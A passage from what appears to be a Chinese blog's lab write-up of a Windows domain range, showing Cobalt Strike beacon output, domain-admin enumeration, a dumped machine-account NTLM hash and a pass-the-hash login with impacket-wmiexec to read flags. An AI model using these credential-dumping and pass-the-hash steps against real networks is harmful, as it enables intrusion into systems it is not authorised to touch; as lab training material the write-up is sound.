+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[03/20 19:41:44] beacon&gt; shell type C:\Users\Administrator\flag\flag02.txt</span><br><span class="line">[03/20 19:41:44] [*] Tasked beacon to run: type C:\Users\Administrator\flag\flag02.txt</span><br><span class="line">[03/20 19:41:45] [+] host called home, sent: 74 bytes</span><br><span class="line">[03/20 19:41:45] [+] received output:</span><br><span class="line">   . .    .       . .       . .       .      .       . .       . .       . .    .    </span><br><span class="line">.+&#x27;|=|`+.=|`+. .+&#x27;|=|`+. .+&#x27;|=|`+. .+&#x27;|      |`+. .+&#x27;|=|`+. .+&#x27;|=|`+. .+&#x27;|=|`+.=|`+. </span><br><span class="line">|.+&#x27; |  | `+.| |  | `+.| |  | `+.| |  |      |  | |  | `+.| |  | `+ | |.+&#x27; |  | `+.| </span><br><span class="line">     |  |      |  | .    |  |      |  |      |  | |  |=|`.  |  |  | |      |  |      </span><br><span class="line">     |  |      `+.|=|`+. |  |      |  |      |  | |  | `.|  |  |  | |      |  |      </span><br><span class="line">     |  |      .    |  | |  |    . |  |    . |  | |  |    . |  |  | |      |  |      </span><br><span class="line">     |  |      |`+. |  | |  | .+&#x27;| |  | .+&#x27;| |  | |  | .+&#x27;| |  |  | |      |  |      </span><br><span class="line">     |.+&#x27;      `+.|=|.+&#x27; `+.|=|.+&#x27; `+.|=|.+&#x27; |.+&#x27; `+.|=|.+&#x27; `+.|  |.|      |.+&#x27;      </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag02: flag&#123;44c7980b-fdbc-4018-8c89-2abecc055a12&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Flag03"><a href="#Flag03" class="headerlink" title="Flag03"></a>Flag03</h1><hr>
+<h2 id="查看域成员"><a href="#查看域成员" class="headerlink" title="查看域成员"></a>查看域成员</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">net</span> group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure>
+<p>发现当前机器<code>WIN2016$</code>用户也是域管理员</p>
+<h2 id="抓取WIN2016-机器用户的hash"><a href="#抓取WIN2016-机器用户的hash" class="headerlink" title="抓取WIN2016$机器用户的hash"></a>抓取<code>WIN2016$</code>机器用户的<code>hash</code></h2><p><img src="/img/obsidian/97a20c298e6ce261.png" alt="file-20260320202207546.png" loading='lazy'></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">295b96a04c73d4dbcd34b4a615f5a690</span><br></pre></td></tr></table></figure>
+<h2 id="wmiexec连接"><a href="#wmiexec连接" class="headerlink" title="wmiexec连接"></a><code>wmiexec</code>连接</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-wmiexec -hashes :295b96a04c73d4dbcd34b4a615f5a690 xiaorang.lab/WIN2016\$@172.22.8.15 -codec gbk</span><br></pre></td></tr></table></figure>
+<p><img src="/img/obsidian/32591998d17bfe28.png" alt="file-20260320202258968.png" loading='lazy'></p>
+<h2 id="读取flag3"><a href="#读取flag3" class="headerlink" title="读取flag3"></a>读取<code>flag3</code></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\Administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;type C:\Users\Administrator\flag\flag03.txt</span><br><span class="line"> _________               __    _                  _    </span><br><span class="line">|  _   _  |             [  |  (_)                / |_  </span><br><span class="line">|_/ | | \_|.--.   .---.  | |  __  .---.  _ .--. `| |-&#x27; </span><br><span class="line">    | |   ( (`\] / /&#x27;`\] | | [  |/ /__\\[ `.-. | | |   </span><br><span class="line">   _| |_   `&#x27;.&#x27;. | \__.  | |  | || \__., | | | | | |,  </span><br><span class="line">  |_____| [\__) )&#x27;.___.&#x27;[___][___]&#x27;.__.&#x27;[___||__]\__/  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations! ! !</span><br><span class="line"></span><br><span class="line">flag03: flag&#123;5348cfa4-de27-43e4-80c6-dd9a247d22a6&#125;</span><br><span class="line"></span><br><span class="line">C:\&gt;</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="/">Xur0n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://wangchengxu8661.github.io/posts/33b3a21cd214af87/">https://wangchengxu8661.github.io/posts/33b3a21cd214af87/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://wangchengxu8661.github.io" target="_blank">Xur0n 的博客</a>！</span></div></div><div class="tag_share"></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/374e53a4a2ca4386/" title="Time"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Time</div></div><div class="info-2"><div class="info-item-1">Time 靶场解题记录，梳理 Neo4j 信息收集、Kerberos 认证、权限提升与横向移动思路。</div></div></div></a><a class="pagination-related" href="/posts/86299238923c6871/" title="Initial"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Initial</div></div><div class="info-2"><div class="info-item-1">Initial 靶场解题笔记，记录从信息收集到内网渗透、权限提升的实践过程。</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/profile-256.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="author-info-name">Xur0n</div><div class="author-info-description">一半求知，一半记录，余下的交给时间。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">将昨日的疑问整理成页，等明日的自己来翻。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E4%BB%8B%E7%BB%8D"><span class="toc-text">靶场介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Flag01"><span class="toc-text">Flag01</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#msssql%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-text">msssql弱口令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BFCS%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83SeImpersonatePrivilege"><span class="toc-text">上线CS土豆提权SeImpersonatePrivilege</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Flag02"><span class="toc-text">Flag02</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E6%90%AD%E5%BB%BA"><span class="toc-text">内网代理搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E4%B8%8A%E7%BA%BF"><span class="toc-text">在线用户进程注入上线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F"><span class="toc-text">内网扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B6%82%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81"><span class="toc-text">密码喷涂修改密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RDP%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95"><span class="toc-text">RDP远程登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%95%9C%E5%83%8F%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83"><span class="toc-text">镜像劫持提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96flag2"><span class="toc-text">读取flag2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Flag03"><span class="toc-text">Flag03</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E6%88%90%E5%91%98"><span class="toc-text">查看域成员</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%93%E5%8F%96WIN2016-%E6%9C%BA%E5%99%A8%E7%94%A8%E6%88%B7%E7%9A%84hash"><span class="toc-text">抓取WIN2016$机器用户的hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wmiexec%E8%BF%9E%E6%8E%A5"><span class="toc-text">wmiexec连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96flag3"><span class="toc-text">读取flag3</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/18e0b59a6d94edec/" title="接触 CTF 一周年：关于 AI、比赛和自己的一些反思">接触 CTF 一周年：关于 AI、比赛和自己的一些反思</a><time datetime="2026-10-31T16:00:00.000Z" title="发表于 2026-11-01 00:00:00">2026-11-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/campus-net-android/" title="校园网助手：Android 校园网自动认证与双网检测">校园网助手：Android 校园网自动认证与双网检测</a><time datetime="2026-10-19T16:00:00.000Z" title="发表于 2026-10-20 00:00:00">2026-10-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/software-security-2026-misc/" title="2026软件系统安全赛 · Misc WP">2026软件系统安全赛 · Misc WP</a><time datetime="2026-04-21T00:00:00.000Z" title="发表于 2026-04-21 08:00:00">2026-04-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/software-security-2026-system/" title="2026软件系统安全赛 · 系统攻击 WP">2026软件系统安全赛 · 系统攻击 WP</a><time datetime="2026-04-21T00:00:00.000Z" title="发表于 2026-04-21 08:00:00">2026-04-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/374e53a4a2ca4386/" title="Time">Time</a><time datetime="2026-03-26T15:37:39.000Z" title="发表于 2026-03-26 23:37:39">2026-03-26</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2026 By Xur0n</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></span></div><div class="footer_custom_text">记录，慢慢来。</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.0"></script><script src="/js/main.js?v=5.7.0"></script><div class="js-pjax"></div><script src="/js/accessibility.js?v=2320e2828869" defer></script></div></body></html>
